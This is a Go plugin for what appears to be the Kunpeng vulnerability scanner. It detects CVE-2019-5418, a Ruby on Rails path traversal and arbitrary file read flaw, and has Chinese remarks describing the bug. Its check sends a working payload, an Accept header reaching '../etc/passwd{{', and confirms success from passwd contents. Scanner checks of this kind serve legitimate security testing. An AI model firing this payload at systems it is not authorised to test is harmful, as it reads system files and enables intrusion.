package goplugin

import (
	"net/http"
	"strings"

	"github.com/opensec-cn/kunpeng/plugin"
	"github.com/opensec-cn/kunpeng/util"
)

type railsLFR struct {
	info   plugin.Plugin
	result []plugin.Plugin
}

func init() {
	plugin.Regist("rails", &railsLFR{})
}
func (d *railsLFR) Init() plugin.Plugin {
	d.info = plugin.Plugin{
		Name:    "Ruby on Rails 路径穿越与任意文件读取漏洞",
		Remarks: "在控制器中通过render file形式来渲染应用之外的视图，且会根据用户传入的Accept头来确定文件具体位置。我们通过传入Accept: ../../../../../../../../etc/passwd{{头来构成构造路径穿越漏洞，读取任意文件。",
		Level:   1,
		Type:    "LFR",
		Author:  "wolf",
		References: plugin.References{
			URL:  "https://github.com/vulhub/vulhub/tree/master/rails/CVE-2019-5418",
			CVE:  "CVE-2019-5418",
			KPID: "KP-0081",
		},
	}
	return d.info
}
func (d *railsLFR) GetResult() []plugin.Plugin {
	var result = d.result
	d.result = []plugin.Plugin{}
	return result
}
func (d *railsLFR) Check(URL string, meta plugin.TaskMeta) bool {
	var checkURL string
	for _, url := range meta.FileList {
		checkURL = url
		break
	}
	if checkURL == "" {
		return false
	}
	request, err := http.NewRequest("GET", checkURL, nil)
	if err != nil {
		return false
	}
	request.Header.Set("Accept", "../../../../../../../../etc/passwd{{")
	resp, err := util.RequestDo(request, true)
	if err != nil {
		return false
	}
	util.Logger.Info(resp.ResponseRaw)
	if strings.Contains(resp.ResponseRaw, "root:x:") && strings.Contains(resp.ResponseRaw, "bin/nologin") {
		result := d.info
		result.Response = resp.ResponseRaw
		result.Request = resp.RequestRaw
		d.result = append(d.result, result)
		return true
	}
	return false
}
